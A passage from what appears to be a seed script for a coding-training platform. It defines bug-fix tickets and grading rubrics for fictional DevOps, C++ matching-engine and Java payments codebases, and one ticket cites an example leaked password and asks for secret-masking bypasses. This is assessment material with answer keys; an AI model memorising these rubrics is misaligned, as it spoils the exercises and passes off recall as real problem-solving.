      title: "IC-13: Frontend Deployment Has One Replica and No PodDisruptionBudget",
      description: `During last month's Kubernetes node upgrade, the ops team drained nodes one at a time. When the node hosting the single frontend pod was drained, Kubernetes evicted the pod. The pod took 47 seconds to reschedule and start on a new node — during which the frontend returned 503 to all users.

The incident report flagged two missing safeguards: multiple replicas so draining one node doesn't take down the only frontend instance, and a PodDisruptionBudget to ensure Kubernetes cannot evict all instances simultaneously.

**Root cause in \`kubernetes/deployments/frontend-deployment.yaml\`:**
- \`replicas: 1\` — single point of failure
- No \`PodDisruptionBudget\` resource exists

**Your task:**
1. Change \`replicas: 1\` to \`replicas: 2\` so there is always at least one replica available during a node drain
2. Create a PodDisruptionBudget in \`kubernetes/deployments/frontend-deployment.yaml\` (or a new file) with \`minAvailable: 1\`
3. Explain why a PDB with \`minAvailable: 1\` would have prevented the outage even if \`replicas\` had stayed at 1

**Files:** \`kubernetes/deployments/frontend-deployment.yaml\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["kubernetes/deployments/frontend-deployment.yaml"],
      rubric: {
        diagnosis: "Did they identify both the single replica and the missing PDB as contributing to the outage? Did they understand that even with 2 replicas, a PDB is needed to prevent both from being evicted simultaneously?",
        design: "Did they set replicas to at least 2? Did they add a PodDisruptionBudget with minAvailable: 1 (or maxUnavailable: 1)? Is the PDB selector matching the frontend app label?",
        communication: "Did they explain that a PDB with minAvailable: 1 would have blocked the drain of the node hosting the last frontend pod, even with replicas: 1? Did they explain voluntary vs involuntary disruptions?",
        execution: "Is replicas set to >= 2? Is a PodDisruptionBudget resource present with the correct selector and minAvailable: 1? Would the PDB have prevented the specific outage scenario?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-ic-14-seed-id-014",
      title: "IC-14: Worker Deployment Uses imagePullPolicy: Never",
      description: `After the team shipped a critical security patch to the worker image last Tuesday, they pushed \`axiom/worker:3.2.2\` to the registry and updated the deployment manifest. However, worker pods on two of the three nodes kept running the old \`3.2.1\` image — the patched version never loaded.

Investigation found \`imagePullPolicy: Never\` in the worker deployment. Kubernetes was using the \`3.2.1\` image cached on those nodes from a previous pull and never contacted the registry to check for the updated image.

**Root cause in \`kubernetes/deployments/worker-deployment.yaml\`:**
\`imagePullPolicy: Never\` prevents Kubernetes from ever pulling a new image from the registry.

**Your task:**
1. Change \`imagePullPolicy\` to \`IfNotPresent\` (correct for pinned semver tags like \`3.2.1\`)
2. Explain when you would use \`Always\` vs \`IfNotPresent\` and why \`Never\` should only exist in local development environments
3. Explain why using a mutable image tag (like \`:latest\`) with \`IfNotPresent\` is also dangerous

**Files:** \`kubernetes/deployments/worker-deployment.yaml\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["kubernetes/deployments/worker-deployment.yaml"],
      rubric: {
        diagnosis: "Did they identify imagePullPolicy: Never as the reason cached old images were used? Did they understand the deployment was technically 'updated' but nodes pulled nothing?",
        design: "Did they change to IfNotPresent? Did they correctly distinguish: Never=always use cache, IfNotPresent=pull if not on node, Always=always pull from registry? Did they explain the :latest + IfNotPresent trap?",
        communication: "Did they explain that IfNotPresent is correct for pinned tags (since the same tag always means the same image), while Always is needed for mutable tags? Did they explain that :latest + IfNotPresent leads to different nodes running different versions?",
        execution: "Is imagePullPolicy changed from Never to IfNotPresent? Are Always, IfNotPresent, and Never accurately described with correct use cases?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-ic-15-seed-id-015",
      title: "IC-15: Database Password Printed to GitHub Actions Log",
      description: `A new engineer opened a pull request this morning, noticed the GitHub Actions log from the last deploy, and shared a screenshot in Slack: the log clearly shows \`Deploying with DB password: Pr0duct10n#DB2024!\` and the JWT secret. The logs are visible to all 23 repository collaborators and are retained by GitHub for 90 days.

The password has been rotated, but the CI pipeline still contains the \`echo\` statements that caused the leak.

**Root cause in \`.github/workflows/deploy.yml\`:**
The "Debug deployment config" step uses \`echo "... \${{ secrets.DB_PASSWORD }}"\`. GitHub Actions interpolates the secret value into the shell command before it runs, so the expanded plaintext appears in the log.

**Your task:**
1. Delete the entire "Debug deployment config" step from the workflow
2. Explain why GitHub's secret masking is not a reliable safeguard (give at least two bypass scenarios)
3. If you need to verify a secret is configured without printing it, show the correct approach using an \`if:\` condition or \`[[ -n "$VAR" ]]\` check

**Files:** \`.github/workflows/deploy.yml\``,
      difficulty: Difficulty.MID,
      filesInvolved: [".github/workflows/deploy.yml"],
      rubric: {
        diagnosis: "Did they identify that ${{ secrets.X }} is interpolated before shell execution, printing the raw value to stdout? Did they understand this is a design-time error, not a runtime one?",
        design: "Did they remove the debug step? Did they give two valid masking bypass scenarios (e.g. base64 encoding, character-by-character echo, truncation)? Did they show a safe alternative like [[ -n \"$DB_PASSWORD\" ]] && echo 'DB_PASSWORD is set'?",
        communication: "Did they explain that GitHub's masking only covers the exact stored value and known transformations? Did they mention that secrets printed to logs are also captured by any third-party action in the same job?",
        execution: "Is the debug step removed? Are at least two masking bypass scenarios described accurately? Is a safe verification alternative shown?",
      },
      expectedMinutes: 20,
    },
  ];

  for (const t of infracoreTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.DEVOPS, codebaseId: infracoreCodebase.id },
    });
  }

  // ─── MatchCore — C++17 order matching engine ────────────────────────────────
  const matchcoreCodebase = await prisma.codebase.upsert({
    where: { id: "matchcore-seed-id-001" },
    update: { repoUrl: "https://github.com/DevSimulate/matchcore" },
    create: {
      id: "matchcore-seed-id-001",
      name: "MatchCore",
      stack: Stack.CPP,
      repoUrl: "https://github.com/DevSimulate/matchcore",
      description: "A C++17 limit-order-matching engine — the core of a low-latency trading system. Price-time priority order book, pre-trade risk checks, and an object pool on the hot path.",
      companyLore: `Vellum Markets runs a high-throughput electronic exchange. MatchCore is the matching layer — every order in the building flows through it. Latency is measured in microseconds and correctness is measured in dollars: a single mismatched fill or a torn read under concurrency can mean a real loss. The team is small, the code is dense, and the bugs are the kind that only show up under load.`,
    },
  });

  const matchcoreTickets = [
    {
      id: "ticket-mc-01-seed-id-001",
      title: "MC-01: Large orders silently bypass the risk limit",
      description: `Risk reported that a 200,000-share order at a price of 50,000 ticks went through on a symbol with a 1,000,000,000 notional limit — even though 50,000 × 200,000 = 10,000,000,000, which is 10× the limit. Smaller orders are checked correctly. The bigger the order, the more likely it slips through, and sometimes a huge order is *more* likely to pass than a medium one.

**Files:** \`include/risk_manager.h\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["include/risk_manager.h"],
      rubric: {
        diagnosis: "Did they identify that notional (price * quantity, both int64_t) is computed into a 32-bit int, overflowing and wrapping — sometimes to a negative value that passes the <= check? Did they note the limit itself is also an int?",
        design: "Did they change the notional computation and the stored limit to int64_t so values up to ~9.2e18 are representable? Did they consider where else notional is computed?",
        communication: "Did they explain integer overflow / implicit narrowing as the root cause, and why bigger orders are MORE likely to pass (wrap to negative)?",
        execution: "Is the type widened correctly so the documented example (10e9 > 1e9) is now rejected?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-mc-02-seed-id-002",
      title: "MC-02: Some resting orders are skipped during a sweep",
      description: `When an aggressive order sweeps a price level that has several resting orders, occasionally one of the resting orders is left untouched even though there was incoming quantity to fill it. It happens specifically when a resting order is fully filled and removed in the middle of the level.

**Files:** \`src/order_book.cpp\` (the matching loop)`,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/order_book.cpp"],
      rubric: {
        diagnosis: "Did they see that the matching loop iterates by index i and calls level.orders.erase(begin()+i) when a resting order fills, then ++i — so the next order shifts into slot i and is skipped?",
        design: "Did they fix the iteration so no order is skipped after an erase (e.g. don't increment i when erasing, or iterate differently)? Did they keep price-time priority intact?",
        communication: "Did they explain the container-mutation-during-iteration bug and how the index/iterator gets out of sync with the deque?",
        execution: "Does every resting order at the level get a chance to fill when incoming quantity remains?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-mc-03-seed-id-003",
      title: "MC-03: Engine statistics start at garbage values",
      description: `On a fresh engine, before any orders are submitted, \`stats()\` returns nonsense — total_volume in the billions, orders_submitted nonzero, notional_traded negative. After the first few orders the numbers look plausible again but are always off by the initial garbage.

**Files:** \`include/matching_engine.h\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["include/matching_engine.h"],
      rubric: {
        diagnosis: "Did they identify that EngineStats has no initializers and the stats_ member is default-initialized, leaving its fields with indeterminate values?",
        design: "Did they zero-initialize the stats (member initializers in the struct, or value-initialize stats_)? Did they pick a fix that can't be forgotten again (in-struct defaults)?",
        communication: "Did they explain that built-in types in a struct are not zeroed unless explicitly initialized?",
        execution: "Do all stats read as 0 on a fresh engine?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-mc-04-seed-id-004",
      title: "MC-04: Filled and cancelled orders are never reclaimed — memory grows forever",
      description: `Under a long replay the process RSS climbs without bound and never comes back down, even though the book stays roughly the same size. The OrderPool's live_count() keeps rising. We add and remove millions of orders a day; memory should be roughly flat.

**Files:** \`src/order_book.cpp\`, \`src/matching_engine.cpp\`, \`include/object_pool.h\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/order_book.cpp", "src/matching_engine.cpp", "include/object_pool.h"],
      rubric: {
        diagnosis: "Did they identify that when an order is filled or cancelled it is removed from the book/index but never returned to the pool via release(), so storage_ grows unboundedly?",
        design: "Did they call pool_.release() at the right points (on full fill and on cancel) WITHOUT introducing use-after-free? Did they consider that the pool's release semantics interact with who still holds the pointer?",
        communication: "Did they explain the leak as 'acquired but never released' and connect it to live_count rising?",
        execution: "Does live_count stay bounded across a long add/remove cycle?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-mc-05-seed-id-005",
      title: "MC-05: The order book corrupts after enough orders rest",
      description: `Everything works for the first few thousand orders, then fills start referencing wrong prices and quantities, and occasionally the process crashes. It correlates with the number of *distinct* orders ever acquired from the pool, not the current book size. A debug build with sanitizers screams about heap-use-after-free pointing into the pool's storage.

**Files:** \`include/object_pool.h\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["include/object_pool.h"],
      rubric: {
        diagnosis: "Did they identify that OrderPool stores Order objects in a std::vector and returns &storage_.back()? When the vector grows past its reserved capacity it REALLOCATES, invalidating every Order* already handed out (held by the book, the index, and the free list) — classic pointer invalidation / use-after-free.",
        design: "Did they choose a storage strategy whose element addresses are stable (e.g. std::deque, a list of fixed-size blocks/chunks, or pre-allocating and never reallocating)? Did they explain why reserve() alone is not a real fix for an unbounded pool?",
        communication: "Did they articulate iterator/pointer invalidation on vector growth and why it correlates with total orders acquired, not live count?",
        execution: "Does the fix keep all previously-returned Order* valid for the lifetime of the order?",
      },
      expectedMinutes: 55,
    },
    {
      id: "ticket-mc-06-seed-id-006",
      title: "MC-06: Two threads on different symbols still corrupt shared state",
      description: `We shard symbols across threads, each symbol guarded by its own mutex, so two threads working different symbols should never interfere. But under load we see duplicate order ids, lost stat updates, and rare crashes inside the order pool — even when the two threads touch completely different symbols.

**Files:** \`src/matching_engine.cpp\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/matching_engine.cpp"],
      rubric: {
        diagnosis: "Did they see that next_id_++, pool_.acquire(), and the stats_ updates touch ENGINE-WIDE shared state but happen outside (or only partially inside) the per-symbol lock — so two threads on different symbols race on next_id_, the shared OrderPool, and stats_?",
        design: "Did they protect the engine-wide shared state correctly — e.g. an atomic id counter, a thread-safe or per-shard pool, and synchronized stats — without serializing the whole engine or reintroducing the per-symbol locking they already have? Did they reason about lock granularity?",
        communication: "Did they distinguish per-symbol state (already locked) from engine-global state (unprotected) and explain the data race precisely?",
        execution: "Are id generation, pool access, and stats updates race-free under concurrent multi-symbol load?",
      },
      expectedMinutes: 55,
    },
    {
      id: "ticket-mc-07-seed-id-007",
      title: "MC-07: best_bid / best_ask occasionally return a stale or wrong price",
      description: `A market-data consumer prints the top of book. Most of the time it's right, but right after a price level empties, best_bid() or best_ask() sometimes returns a price that no longer has any orders, or 0 when the book is clearly not empty.

**Files:** \`src/order_book.cpp\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/order_book.cpp"],
      rubric: {
        diagnosis: "Did they trace that when a price level is fully consumed during matching, the orders are erased from the level but the empty PriceLevel is NOT removed from bids_/asks_, so best_bid/best_ask return the price of an empty level? (And the reverse: cancel() does erase empty levels, creating inconsistent behavior.)",
        design: "Did they ensure empty levels are removed from the maps after matching (or best_bid/best_ask skip empty levels)? Did they make the two code paths consistent?",
        communication: "Did they explain the invariant 'a price present in the map must have resting orders' and where it's violated?",
        execution: "Does top-of-book always reflect a level that actually has orders?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-mc-08-seed-id-008",
      title: "MC-08: Market orders rest on the book instead of being discarded",
      description: `A market order that can't be fully filled (not enough liquidity) should fill what it can and drop the remainder — it must never rest. We're seeing leftover market-order quantity sitting in the book at price 0, polluting top-of-book.

**Files:** \`src/order_book.cpp\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/order_book.cpp"],
      rubric: {
        diagnosis: "Did they find that submit() only checks order->quantity > 0 before resting, but a partially-filled MARKET order also has quantity > 0 and price 0, so it gets rested via the type==Limit guard? Did they verify the exact condition under which a market remainder rests?",
        design: "Did they ensure market orders never rest (the remainder is dropped/cancelled) while limit remainders still rest correctly?",
        communication: "Did they explain market vs limit resting semantics?",
        execution: "Does an unfilled market remainder get discarded, leaving no price-0 junk in the book?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-mc-09-seed-id-009",
      title: "MC-09: Copying an OrderBook leads to crashes and double frees",
      description: `A reporting tool makes a copy of an OrderBook to run analytics off the hot path. With the pool-based design, copying a book and then letting both books continue causes crashes, double-frees, and orders mutating in two places at once. We need a clear, safe policy for copying.

**Files:** \`include/order_book.h\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["include/order_book.h"],
      rubric: {
        diagnosis: "Did they recognize that OrderBook holds raw Order* (owned by the pool) and the implicitly-generated copy constructor does a shallow copy — so two books share the same Order* and the same pool slots, leading to double-release / aliasing (rule of three/five violation)?",
        design: "Did they pick a coherent ownership policy — delete the copy constructor/assignment (non-copyable) and/or provide a deep snapshot that copies Order VALUES, not pointers? Did they justify the choice given the pool owns the memory?",
        communication: "Did they explain rule of three/five and why shallow-copying pointer-owning aggregates is unsafe?",
        execution: "Is copying either safely disabled or implemented as a correct deep snapshot?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-mc-10-seed-id-010",
      title: "MC-10: Cancelling an order from another symbol's book silently no-ops or worse",
      description: `cancel(symbol, id) sometimes returns true for an id that belongs to a *different* symbol, decrementing the wrong level's total_qty and corrupting that book's depth accounting. The id index is global in spirit but the books are per-symbol.

**Files:** \`src/order_book.cpp\`, \`include/order_book.h\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/order_book.cpp", "include/order_book.h"],
      rubric: {
        diagnosis: "Did they identify that each OrderBook has its own index_ but cancel() looks up bids_[price]/asks_[price] via operator[] — which DEFAULT-CONSTRUCTS an empty level if the price isn't present — and then the empty-level cleanup and total_qty math operate on a bogus level? Did they note operator[] inserting is the trap?",
        design: "Did they use find() instead of operator[] so a missing price doesn't create a phantom level, and return false cleanly when the order isn't in this book?",
        communication: "Did they explain std::map::operator[]'s insert-on-miss behavior as the root cause?",
        execution: "Does cancel only affect the correct level and never create phantom levels?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-mc-11-seed-id-011",
      title: "MC-11: Throughput collapses as orders get larger",
      description: `Latency profiling shows the matching path spends most of its time copying. Fills are returned by value and the vector grows; for large sweeps that generate thousands of fills, we copy the whole fill vector repeatedly. Throughput drops sharply as average order size rises.

**Files:** \`src/order_book.cpp\`, \`include/order_book.h\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/order_book.cpp", "include/order_book.h"],
      rubric: {
        diagnosis: "Did they identify unnecessary copies on the hot path — e.g. fills vectors being copied rather than moved between match() and submit(), and/or no reserve() so the fills vector reallocates repeatedly during a large sweep?",
        design: "Did they apply move semantics (return/std::move the vector), reserve() an estimate up front, and avoid per-fill reallocation? Did they avoid micro-optimizing the wrong thing?",
        communication: "Did they explain copy vs move and reallocation cost, ideally with the O(n) copy growth?",
        execution: "Are the redundant copies eliminated so cost scales with fills produced, not copied?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-mc-12-seed-id-012",
      title: "MC-12: Self-trade — an order matches against the same account's resting order",
      description: `Compliance flagged trades where the buy and sell order belong to the same client. The engine currently matches purely on price-time priority with no self-trade prevention. We need to skip resting orders from the same account and continue matching against the next one.

**Files:** \`include/order.h\`, \`src/order_book.cpp\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["include/order.h", "src/order_book.cpp"],
      rubric: {
        diagnosis: "Did they recognize there is no account/owner concept on Order and no self-trade check in the matching loop, so an aggressor can cross its own resting liquidity?",
        design: "Did they add an account identifier to Order and skip (not fill) resting orders with the same account, continuing to the next order while preserving price-time priority? Did they consider the chosen STP policy (skip vs cancel)?",
        communication: "Did they explain self-trade prevention and the policy trade-offs?",
        execution: "Does an incoming order skip same-account resting orders and still match eligible ones correctly?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-mc-13-seed-id-013",
      title: "MC-13: A deadlock appears when we add cross-symbol pair matching",
      description: `We're prototyping a feature that moves liquidity between two correlated symbols, locking both symbols' mutexes. Under load the engine occasionally freezes completely — two threads each holding one symbol's lock and waiting for the other. We need a locking discipline that can't deadlock.

**Files:** \`src/matching_engine.cpp\`, \`include/matching_engine.h\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/matching_engine.cpp", "include/matching_engine.h"],
      rubric: {
        diagnosis: "Did they identify the classic lock-ordering deadlock — thread A locks symbol1 then symbol2, thread B locks symbol2 then symbol1 — when two code paths acquire two per-symbol mutexes in opposite orders?",
        design: "Did they impose a total lock ordering (e.g. always lock the lexicographically-smaller symbol first) or use std::lock / std::scoped_lock to acquire both atomically? Did they explain why this prevents the cycle?",
        communication: "Did they explain the four Coffman conditions or at least circular-wait, and how a global ordering breaks it?",
        execution: "Is the two-symbol locking deadlock-free under concurrent opposite-direction access?",
      },
      expectedMinutes: 50,
    },
    {
      id: "ticket-mc-14-seed-id-014",
      title: "MC-14: Partial-fill status is wrong for orders that fully fill in one trade",
      description: `Downstream systems rely on OrderStatus. An order that is completely filled by a single resting order is sometimes reported as PartiallyFilled instead of Filled, and an order that rests untouched is occasionally marked PartiallyFilled. The status logic at the end of match() doesn't line up with the actual fill outcome.

**Files:** \`src/order_book.cpp\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/order_book.cpp"],
      rubric: {
        diagnosis: "Did they examine the status-assignment block at the end of match() and find the boundary conditions are wrong (the partial vs filled vs untouched cases don't cover quantity == original and quantity == 0 correctly)?",
        design: "Did they make status reflect: filled when quantity==0, partially filled when 0<quantity<original, and unchanged (New) when nothing traded?",
        communication: "Did they enumerate the three outcomes clearly and map each to a status?",
        execution: "Is OrderStatus correct for full-fill, partial-fill, and no-fill cases?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-mc-15-seed-id-015",
      title: "MC-15: A const OrderBook reference still lets callers mutate the book",
      description: `We pass \`const OrderBook&\` to the market-data publisher so it can read top-of-book without modifying it. A code review caught the publisher accidentally calling something that mutates the book through that const reference, and it compiled. We want the const contract to actually prevent mutation.

**Files:** \`include/order_book.h\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["include/order_book.h"],
      rubric: {
        diagnosis: "Did they identify missing const-correctness — read-only accessors (best_bid, best_ask, depth) not marked const, and/or mutating members reachable through a const reference — so the compiler can't enforce the read-only contract?",
        design: "Did they mark genuinely read-only methods const, and ensure mutating operations are not const, so a const OrderBook& can only read? Did they avoid const_cast hacks?",
        communication: "Did they explain const-correctness and why it's a compile-time safety guarantee, not just style?",
        execution: "Does a const OrderBook& expose only read operations and reject mutation at compile time?",
      },
      expectedMinutes: 20,
    },
  ];

  for (const t of matchcoreTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.CPP, codebaseId: matchcoreCodebase.id },
    });
  }

  // ─── FinServe — Java 17 + Spring Boot payments service ──────────────────────
  const finserveCodebase = await prisma.codebase.upsert({
    where: { id: "finserve-seed-id-001" },
    update: { repoUrl: "https://github.com/DevSimulate/finserve" },
    create: {
      id: "finserve-seed-id-001",
      name: "FinServe",
      stack: Stack.JAVA,
      repoUrl: "https://github.com/DevSimulate/finserve",
      description: "A Spring Boot 3 + JPA payments and ledger service. Accounts, atomic transfers, interest, and nightly statement exports — the source of truth for customer balances.",
      companyLore: `Northwind Bank runs FinServe as the ledger of record. Every customer balance, every transfer, every cent flows through it. The team treats money bugs as P0 incidents: a lost update under concurrency or a non-atomic transfer is real money missing from a real customer's account.`,
    },
  });

  const finserveTickets = [
    {
      id: "ticket-fs-01-seed-id-001",
      title: "FS-01: Looking up a missing account 500s instead of returning empty",
      description: "GET /api/accounts/{number} for an account number that doesn't exist throws a NullPointerException and returns a 500. It should cleanly report 'not found'. The crash happens inside the service, not the controller.\n\n**Files:** `service/AccountService.java`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["service/AccountService.java"],
      rubric: {
        diagnosis: "Did they find that getByNumber() calls findByAccountNumber(...).orElse(null) and then immediately dereferences account.getOwnerName() — NPE when the account is absent?",
        design: "Did they guard the null before dereferencing without breaking the blank-name normalisation?",
        communication: "Did they explain that orElse(null) followed by an unconditional method call is the classic NPE trap?",
        execution: "Does a missing account no longer throw, returning a clean not-found result?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-fs-02-seed-id-002",
      title: "FS-02: Accounts vanish from caches/sets after their balance changes",
      description: "We keep Accounts in HashSets and as HashMap keys. After a transfer changes an account's balance, code that looks the account up in those collections suddenly can't find it — even though it's the same account.\n\n**Files:** `model/Account.java`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["model/Account.java"],
      rubric: {
        diagnosis: "Did they identify that equals() uses only id but hashCode() uses mutable fields (including balance), violating the equals/hashCode contract and making the object's hashCode change after it's placed in a hash structure?",
        design: "Did they make hashCode consistent with equals (stable identity) and exclude mutable fields?",
        communication: "Did they explain the equals/hashCode contract and why mutable fields must not feed hashCode for hashed entities?",
        execution: "Do equal accounts share a hashCode, and does an account stay findable after its balance changes?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-fs-03-seed-id-003",
      title: "FS-03: The 'accounts opened' metric undercounts under load",
      description: "The /api/accounts/metrics/opened counter undercounts when accounts are opened concurrently — open 1,000 across 10 threads and it reads less than 1,000.\n\n**Files:** `service/AccountService.java`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["service/AccountService.java"],
      rubric: {
        diagnosis: "Did they identify accountsOpened as a mutable static int incremented with non-atomic ++ (read-modify-write), losing concurrent increments?",
        design: "Did they make it thread-safe (AtomicInteger/LongAdder or synchronization)?",
        communication: "Did they explain that ++ is not atomic and how increments interleave to lose updates?",
        execution: "Does the metric equal the number opened under concurrency?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-fs-04-seed-id-004",
      title: "FS-04: A failed transfer can debit the sender without crediting the receiver",
      description: "If the credit step fails, the sender has already been debited and that debit stays. Money disappears. Transfers must be all-or-nothing.\n\n**Files:** `service/TransferService.java`",
      difficulty: Difficulty.MID,
      filesInvolved: ["service/TransferService.java"],
      rubric: {
        diagnosis: "Did they identify that transfer() is NOT @Transactional, so each save() commits separately — if the second fails, the first (debit) is already committed and can't roll back?",
        design: "Did they wrap the whole transfer in @Transactional so a failure rolls back the debit too (including the transaction record)?",
        communication: "Did they explain transaction boundaries and why per-save auto-commit breaks atomicity?",
        execution: "Does a failure anywhere leave both balances unchanged?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-fs-05-seed-id-005",
      title: "FS-05: Missing account returns 200 with an empty body, not 404",
      description: "The accounts endpoint returns HTTP 200 with a null body for an account that doesn't exist. Clients can't tell 'no such account' from a real one.\n\n**Files:** `controller/AccountController.java`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["controller/AccountController.java"],
      rubric: {
        diagnosis: "Did they see that the controller always wraps the result in ResponseEntity.ok(...), even when the service returns null?",
        design: "Did they map not-found to 404 while keeping the success path at 200?",
        communication: "Did they explain correct REST semantics for absent resources?",
        execution: "Does a missing account return 404 and a present one 200 with the body?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-fs-06-seed-id-006",
      title: "FS-06: Nightly statement export leaks file handles until the batch dies",
      description: "The nightly batch exports thousands of statements and eventually fails with 'Too many open files'. Exported files are sometimes truncated or empty.\n\n**Files:** `service/StatementService.java`",
      difficulty: Difficulty.MID,
      filesInvolved: ["service/StatementService.java"],
      rubric: {
        diagnosis: "Did they find that exportStatement() opens a FileWriter and only flush()es, never close()ing it — leaking handles and risking truncated output?",
        design: "Did they use try-with-resources (or finally) so the writer is always closed?",
        communication: "Did they explain resource leaks and why try-with-resources fits AutoCloseable?",
        execution: "Are files fully written and handles released across many exports?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-fs-07-seed-id-007",
      title: "FS-07: Building a statement fires hundreds of queries (N+1)",
      description: "Generating a statement is slow. Query logs show one query for the transactions, then one extra query per transaction — 501 queries for 500 transactions.\n\n**Files:** `service/StatementService.java`",
      difficulty: Difficulty.MID,
      filesInvolved: ["service/StatementService.java"],
      rubric: {
        diagnosis: "Did they identify the N+1 — buildStatement loads all transactions then calls accounts.findById(...) per transaction?",
        design: "Did they batch the lookups (collect ids, findAllById once and map) or use a fetch join?",
        communication: "Did they explain N+1 and the improvement to a constant number of queries?",
        execution: "Does building a statement use a bounded number of queries instead of one per transaction?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-fs-08-seed-id-008",
      title: "FS-08: Interest application corrupts balances with rounding drift",
      description: "After the daily interest job runs a while, balances are off by fractions of a cent and the errors accumulate. Reconciliation flags accounts a penny or two off.\n\n**Files:** `service/AccountService.java`",
      difficulty: Difficulty.MID,
      filesInvolved: ["service/AccountService.java"],
      rubric: {
        diagnosis: "Did they identify that applyInterest converts BigDecimal to double, does floating-point math, and converts back — losing precision and drifting?",
        design: "Did they do the math entirely in BigDecimal with an explicit scale and RoundingMode, never touching double?",
        communication: "Did they explain why double must never represent money and how drift accumulates?",
        execution: "Is interest computed in BigDecimal with explicit rounding, eliminating drift?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-fs-09-seed-id-009",
      title: "FS-09: Transfer failures are reported to the client as success",
      description: "A transfer that throws (insufficient funds, missing account) returns HTTP 200 with {\"status\":\"PENDING\"} and the client shows success. The user thinks money moved when it didn't.\n\n**Files:** `controller/TransferController.java`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["controller/TransferController.java"],
      rubric: {
        diagnosis: "Did they find the catch-all that swallows every exception and returns ok('PENDING'), hiding real failures behind a fake success?",
        design: "Did they let real errors surface with appropriate status codes (400/404/500) instead of blanket-swallowing, without leaking internals?",
        communication: "Did they explain why swallowing exceptions into a success response is dangerous, especially for money?",
        execution: "Do failed transfers return an error status and successful ones the transaction?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-fs-10-seed-id-010",
      title: "FS-10: Concurrent transfers from the same account lose money (lost update)",
      description: "Two transfers debiting the same account at once sometimes both succeed when only one should fit the balance, and the final balance reflects only one debit. Classic 'both read 100, both write 90'.\n\n**Files:** `service/TransferService.java`, `model/Account.java`",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["service/TransferService.java", "model/Account.java"],
      rubric: {
        diagnosis: "Did they identify the read-modify-write race with no locking or @Version — both transactions read the same balance, both pass the check, the second write overwrites the first, losing a debit?",
        design: "Did they choose and justify a correct concurrency control — optimistic (@Version + retry), pessimistic (SELECT FOR UPDATE), or an atomic update query — and handle the retry/failure path?",
        communication: "Did they explain lost update and the optimistic-vs-pessimistic trade-offs?",
        execution: "Under concurrent same-account transfers, is every debit accounted for and the funds check never bypassed?",
      },
      expectedMinutes: 55,
    },
    {
      id: "ticket-fs-11-seed-id-011",
      title: "FS-11: The rebalancing job occasionally deadlocks the service",
      description: "rebalance(A,B,...) runs on multiple threads. Under load it sometimes hangs forever — two threads each holding one account, waiting for the other. Thread dumps show a deadlock.\n\n**Files:** `service/TransferService.java`",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["service/TransferService.java"],
      rubric: {
        diagnosis: "Did they identify the lock-ordering deadlock — rebalance synchronizes on A then B, so rebalance(A,B) and rebalance(B,A) acquire locks in opposite order? Bonus: did they note synchronizing on JPA entities won't coordinate across transactions/nodes?",
        design: "Did they impose a consistent global lock ordering (e.g. lower id first) or replace in-JVM locking with DB-level locking that works across instances?",
        communication: "Did they explain circular-wait and why a total ordering breaks it, plus why entity-monitor locking doesn't scale?",
        execution: "Is the two-account rebalance deadlock-free under opposite-direction concurrent calls?",
      },
      expectedMinutes: 50,
    },
    {
      id: "ticket-fs-12-seed-id-012",
      title: "FS-12: Negative or zero transfer amounts are accepted",
      description: "You can POST a transfer with amount 0 or negative. A negative transfer effectively moves money the wrong way. There's no validation.\n\n**Files:** `service/TransferService.java`, `controller/TransferController.java`",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["service/TransferService.java", "controller/TransferController.java"],
      rubric: {
        diagnosis: "Did they identify that amount is never validated to be strictly positive, so 0 and negatives invert or no-op the transfer?",
        design: "Did they reject non-positive amounts (BigDecimal compareTo ZERO) at a sensible layer with a 400?",
        communication: "Did they explain the correctness/security impact of unvalidated monetary input?",
        execution: "Are zero and negative amounts rejected with a clear error while positives still work?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-fs-13-seed-id-013",
